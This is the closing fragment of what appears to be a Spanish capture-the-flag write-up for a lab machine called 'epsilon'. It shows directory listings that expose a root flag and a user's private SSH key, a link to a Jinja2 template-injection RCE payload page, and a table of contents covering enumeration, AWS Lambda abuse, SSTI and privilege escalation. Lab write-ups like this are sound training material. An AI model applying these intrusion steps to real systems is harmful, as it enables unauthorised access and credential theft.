+</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> tom tom   <span style=color:#ae81ff>33</span> Nov <span style=color:#ae81ff>17</span>  <span style=color:#ae81ff>2021</span> .gitconfig
+</span></span><span style=display:flex><span>-rwxr-xr-x  <span style=color:#ae81ff>1</span> tom tom  <span style=color:#ae81ff>453</span> Nov <span style=color:#ae81ff>17</span>  <span style=color:#ae81ff>2021</span> lambda.sh
+</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>3</span> tom tom <span style=color:#ae81ff>4096</span> Dec <span style=color:#ae81ff>20</span>  <span style=color:#ae81ff>2021</span> .local
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>36</span> tom tom <span style=color:#ae81ff>4096</span> Sep <span style=color:#ae81ff>15</span> 04:27 .localstack
+</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> tom tom  <span style=color:#ae81ff>161</span> Dec  <span style=color:#ae81ff>5</span>  <span style=color:#ae81ff>2019</span> .profile
+</span></span><span style=display:flex><span>-rw-r-----  <span style=color:#ae81ff>1</span> tom tom   <span style=color:#ae81ff>33</span> Sep <span style=color:#ae81ff>15</span> 04:27 root.txt
+</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>2</span> tom tom <span style=color:#ae81ff>4096</span> Dec <span style=color:#ae81ff>20</span>  <span style=color:#ae81ff>2021</span> src
+</span></span><span style=display:flex><span>drwx------  <span style=color:#ae81ff>2</span> tom tom <span style=color:#ae81ff>4096</span> Dec <span style=color:#ae81ff>20</span>  <span style=color:#ae81ff>2021</span> .ssh
+</span></span><span style=display:flex><span>tom@epsilon:/tmp/opt/backups/checksum$ ls -la .ssh
+</span></span><span style=display:flex><span>total <span style=color:#ae81ff>20</span>
+</span></span><span style=display:flex><span>drwx------ <span style=color:#ae81ff>2</span> tom tom <span style=color:#ae81ff>4096</span> Dec <span style=color:#ae81ff>20</span>  <span style=color:#ae81ff>2021</span> .
+</span></span><span style=display:flex><span>drwx------ <span style=color:#ae81ff>9</span> tom tom <span style=color:#ae81ff>4096</span> Dec <span style=color:#ae81ff>20</span>  <span style=color:#ae81ff>2021</span> ..
+</span></span><span style=display:flex><span>-rw------- <span style=color:#ae81ff>1</span> tom tom  <span style=color:#ae81ff>566</span> Dec  <span style=color:#ae81ff>1</span>  <span style=color:#ae81ff>2021</span> authorized_keys
+</span></span><span style=display:flex><span>-rw------- <span style=color:#ae81ff>1</span> tom tom <span style=color:#ae81ff>2602</span> Dec  <span style=color:#ae81ff>1</span>  <span style=color:#ae81ff>2021</span> id_rsa
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> tom tom  <span style=color:#ae81ff>566</span> Dec  <span style=color:#ae81ff>1</span>  <span style=color:#ae81ff>2021</span> id_rsa.pub
+</span></span></code></pre></div><h1 id=referencias>Referencias</h1><p><a href=https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Server%20Side%20Template%20Injection/#jinja2-remote-code-execution>Jinja2 RCE</a></p><p><a href=https://docs.aws.amazon.com/cli/latest/reference/lambda/index.html#cli-aws-lambda>AWS Lambda</a></p></p></div></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><a href=#enumeración>Enumeración</a><ul><li><a href=#puerto-80>Puerto 80</a></li><li><a href=#puerto-5000>Puerto 5000</a></li></ul></li><li><a href=#intrusión>Intrusión</a><ul><li><a href=#repositorio-git>Repositorio Git</a></li><li><a href=#aws-lambda>AWS Lambda</a></li><li><a href=#server-side-template-injection>Server Side Template Injection</a></li></ul></li><li><a href=#escalación-de-privilegios>Escalación de Privilegios</a></li><li><a href=#referencias>Referencias</a></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2022 SSBsb3ZlIHlvdTwz</span>
+<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/526avijitgupta/gokarna>Gokarna</a></span></footer></body></html>
